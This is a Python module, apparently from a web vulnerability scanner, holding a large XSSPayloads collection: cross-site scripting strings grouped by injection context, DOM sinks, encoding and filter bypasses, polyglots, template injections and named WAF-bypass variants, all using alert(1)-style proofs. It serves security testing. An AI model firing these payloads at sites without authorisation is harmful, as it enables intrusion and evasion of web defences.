"""
Enhanced XSS payload collection with context-aware detection
"""

from utils.payload_loader import PayloadLoader

class XSSPayloads:
    """Enhanced XSS payload collection with context-aware detection"""
    
    @staticmethod
    def get_basic_payloads():
        """Get basic XSS payloads from text file"""
        all_payloads = PayloadLoader.load_payloads('xss')
        return all_payloads[:20] if len(all_payloads) > 20 else all_payloads
    
    @staticmethod
    def get_advanced_payloads():
        """Get advanced XSS payloads from text file"""
        all_payloads = PayloadLoader.load_payloads('xss')
        return all_payloads[20:] if len(all_payloads) > 20 else []
    
    @staticmethod
    def get_all_payloads():
        """Get all XSS payloads including context-aware and DOM XSS payloads"""
        return (
            XSSPayloads.get_basic_payloads() +
            XSSPayloads.get_context_aware_payloads() +
            XSSPayloads.get_dom_xss_payloads() +
            XSSPayloads.get_filter_bypass_payloads() +
            XSSPayloads.get_polyglot_payloads()
        )
    
    @staticmethod
    def get_context_aware_payloads():
        """Get context-aware XSS payloads for different injection points"""
        return [
            # HTML context payloads
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<iframe src=javascript:alert(1)>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<select onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            '<video><source onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>',
            
            # Attribute context payloads
            '" onmouseover="alert(1)',
            "' onmouseover='alert(1)",
            '" onfocus="alert(1)" autofocus="',
            "' onfocus='alert(1)' autofocus='",
            '" onclick="alert(1)',
            "' onclick='alert(1)",
            '" onload="alert(1)',
            "' onload='alert(1)",
            
            # JavaScript context payloads
            ';alert(1);//',
            ';alert(1);/*',
            '*/alert(1);//',
            '*/alert(1);/*',
            '\';alert(1);//',
            '\";alert(1);//',
            '\\";alert(1);//',
            '\\';alert(1);//',
            
            # CSS context payloads
            '</style><script>alert(1)</script>',
            'expression(alert(1))',
            'url(javascript:alert(1))',
            '/*</style><script>alert(1)</script>*/',
            
            # URL context payloads
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'vbscript:alert(1)',
        ]
    
    @staticmethod
    def get_dom_xss_payloads():
        """Get DOM XSS specific payloads"""
        return [
            # Hash-based DOM XSS
            '#<script>alert(1)</script>',
            '#<img src=x onerror=alert(1)>',
            '#<svg onload=alert(1)>',
            
            # URL parameter manipulation
            '?xss=<script>alert(1)</script>',
            '&xss=<script>alert(1)</script>',
            
            # Fragment identifier
            '#xss=<script>alert(1)</script>',
            
            # PostMessage XSS
            '<script>parent.postMessage("<img src=x onerror=alert(1)>","*")</script>',
            
            # Location manipulation
            '<script>location="javascript:alert(1)"</script>',
            '<script>location.href="javascript:alert(1)"</script>',
            '<script>location.replace("javascript:alert(1)")</script>',
            
            # Document.write XSS
            '<script>document.write("<img src=x onerror=alert(1)>")</script>',
            '<script>document.writeln("<svg onload=alert(1)>")</script>',
            
            # innerHTML XSS
            '<script>document.body.innerHTML="<img src=x onerror=alert(1)>"</script>',
            '<script>document.documentElement.innerHTML="<svg onload=alert(1)>"</script>',
            
            # eval() XSS
            '<script>eval("alert(1)")</script>',
            '<script>eval(atob("YWxlcnQoMSk="))</script>',
            
            # setTimeout/setInterval XSS
            '<script>setTimeout("alert(1)",1)</script>',
            '<script>setInterval("alert(1)",1)</script>',
            '<script>setTimeout(alert,1,1)</script>',
            
            # Function constructor XSS
            '<script>Function("alert(1)")()</script>',
            '<script>new Function("alert(1)")()</script>',
            
            # Event-based DOM XSS
            '<script>window.addEventListener("load",function(){alert(1)})</script>',
            '<script>document.addEventListener("DOMContentLoaded",function(){alert(1)})</script>',
        ]
    
    @staticmethod
    def get_filter_bypass_payloads():
        """Get filter bypass XSS payloads"""
        return [
            # Case variation bypasses
            '<ScRiPt>alert(1)</ScRiPt>',
            '<IMG SRC=x ONERROR=alert(1)>',
            '<SVG ONLOAD=alert(1)>',
            '<iMg sRc=x OnErRoR=alert(1)>',
            
            # Encoding bypasses
            '<script>alert&#40;1&#41;</script>',
            '<script>alert&#x28;1&#x29;</script>',
            '<img src=x onerror=alert&#40;1&#41;>',
            '<svg onload=alert&#x28;1&#x29;>',
            
            # HTML entity encoding
            '&lt;script&gt;alert(1)&lt;/script&gt;',
            '&lt;img src=x onerror=alert(1)&gt;',
            
            # URL encoding
            '%3Cscript%3Ealert(1)%3C/script%3E',
            '%3Cimg%20src=x%20onerror=alert(1)%3E',
            
            # Double encoding
            '%253Cscript%253Ealert(1)%253C/script%253E',
            '%253Cimg%2520src=x%2520onerror=alert(1)%253E',
            
            # Unicode bypasses
            '<script>alert\u0028\u0031\u0029</script>',
            '<img src=x onerror=alert\u0028\u0031\u0029>',
            '<script>\u0061lert(1)</script>',
            
            # Null byte bypasses
            '<script>alert(1)</script>%00',
            '<img src=x onerror=alert(1)>%00',
            '<script%00>alert(1)</script>',
            
            # Comment bypasses
            '<script>/**/alert(1)</script>',
            '<img src=x onerror=/**/alert(1)>',
            '<script>al/**/ert(1)</script>',
            
            # Whitespace bypasses
            '<script\x09>alert(1)</script>',
            '<script\x0A>alert(1)</script>',
            '<script\x0D>alert(1)</script>',
            '<img\x09src=x\x09onerror=alert(1)>',
            '<script\x20>alert(1)</script>',
            
            # Attribute quote bypasses
            '<img src=x onerror="alert(1)">',
            "<img src=x onerror='alert(1)'>",
            '<img src=x onerror=`alert(1)`>',
            '<img src=x onerror=alert(1)>',
            
            # Protocol bypasses
            '<img src="javascript:alert(1)">',
            '<img src="data:text/html,<script>alert(1)</script>">',
            '<img src="vbscript:alert(1)">',
            '<iframe src="javascript:alert(1)">',
            
            # Tag name obfuscation
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            '<img<img src=x onerror=alert(1)//> src=x onerror=alert(1)>',
            '<svg<svg onload=alert(1)//> onload=alert(1)>',
        ]
    
    @staticmethod
    def get_polyglot_payloads():
        """Get polyglot XSS payloads that work in multiple contexts"""
        return [
            # Universal polyglots
            'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>',
            '">\'><marquee><img src=x onerror=confirm(1)></marquee>" onfocus=confirm(1) autofocus>',
            '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
            
            # Multi-context polyglots
            '"><svg/onload=alert(/XSS/)>',
            '\'-alert(1)-\'',
            '"-alert(1)-"',
            '`-alert(1)-`',
            '/*-alert(1)-*/',
            
            # Shorter polyglots
            '"><img src=x onerror=alert(1)>',
            '\'><img src=x onerror=alert(1)>',
            '</script><img src=x onerror=alert(1)>',
            '</style><img src=x onerror=alert(1)>',
            
            # Event handler polyglots
            '" onmouseover="alert(1)" "',
            "' onmouseover='alert(1)' '",
            '` onmouseover=`alert(1)` `',
            '/* onmouseover=alert(1) */',
            
            # CSS polyglots
            '</style><script>alert(1)</script><style>',
            '/*</style><script>alert(1)</script><style>*/',
            'expression(alert(1))',
            
            # Template polyglots
            '{{alert(1)}}',
            '${alert(1)}',
            '#{alert(1)}',
            '<%= alert(1) %>',
            '<%- alert(1) %>',
            
            # Angular/Vue polyglots
            '{{constructor.constructor("alert(1)")()}}',
            '{{$on.constructor("alert(1)")()}}',
            '{{7*7}}{{alert(1)}}',
            '{{[].pop.constructor("alert(1)")()}}',
        ]
    
    @staticmethod
    def get_waf_bypass_payloads():
        """Get WAF bypass XSS payloads"""
        return [
            # Cloudflare bypasses
            '<svg onload=alert`1`>',
            '<iframe srcdoc="<svg onload=alert(1)>">',
            '<object data="javascript:alert(1)">',
            '<embed src="javascript:alert(1)">',
            
            # ModSecurity bypasses
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
            
            # AWS WAF bypasses
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>',
            '<isindex action=javascript:alert(1) type=submit>',
            
            # Generic WAF bypasses
            '<script>alert(/XSS/.source)</script>',
            '<script>alert(1..toString(36))</script>',
            '<script>alert(String.fromCharCode(49))</script>',
            '<script>alert(/1/.source)</script>',
            '<script>alert(1+"")</script>',
            '<script>alert(+!+[]+[+!+[]]+"")</script>',
            '<script>alert((+!+[])+(+!+[]))</script>',
            
            # Obfuscated payloads
            '<script>eval(unescape("%61%6c%65%72%74%28%31%29"))</script>',
            '<script>eval(decodeURIComponent("%61%6c%65%72%74%28%31%29"))</script>',
            '<script>Function("ale"+"rt(1)")()</script>',
            '<script>setTimeout`alert\x281\x29`</script>',
        ]
    
    @staticmethod
    def get_event_handler_payloads():
        """Get event handler based XSS payloads"""
        return [
            # Mouse events
            '<div onmouseover=alert(1)>XSS</div>',
            '<div onmouseout=alert(1)>XSS</div>',
            '<div onmousedown=alert(1)>XSS</div>',
            '<div onmouseup=alert(1)>XSS</div>',
            '<div onclick=alert(1)>XSS</div>',
            '<div ondblclick=alert(1)>XSS</div>',
            
            # Keyboard events
            '<input onkeydown=alert(1)>',
            '<input onkeyup=alert(1)>',
            '<input onkeypress=alert(1)>',
            
            # Form events
            '<form onsubmit=alert(1)><input type=submit></form>',
            '<input onfocus=alert(1) autofocus>',
            '<input onblur=alert(1) autofocus>',
            '<input onchange=alert(1)>',
            '<select onchange=alert(1)><option>1</option></select>',
            
            # Window events
            '<body onload=alert(1)>',
            '<body onunload=alert(1)>',
            '<body onresize=alert(1)>',
            '<body onscroll=alert(1)>',
            
            # Media events
            '<video onloadstart=alert(1)><source></video>',
            '<audio onloadstart=alert(1)><source></audio>',
            '<img onload=alert(1) src=x>',
            '<img onerror=alert(1) src=x>',
            
            # Other events
            '<details ontoggle=alert(1) open>',
            '<marquee onstart=alert(1)>XSS</marquee>',
            '<div onanimationstart=alert(1) style="animation:spin 1s">',
            '<div ontransitionend=alert(1) style="transition:all 1s" onmouseover=this.style.color="red">',
        ]
